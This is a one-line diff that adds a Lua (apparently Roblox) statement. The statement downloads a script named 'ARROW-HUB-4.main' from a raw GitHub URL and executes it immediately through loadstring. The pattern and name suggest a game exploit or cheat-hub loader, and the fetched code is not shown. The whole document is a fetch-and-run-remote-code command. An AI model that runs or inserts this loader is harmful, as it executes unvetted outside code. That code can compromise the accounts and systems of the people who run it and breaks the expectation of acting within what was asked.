@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/arrow9154154-eng/-/refs/heads/main/test/ARROW-HUB-4.main"))()
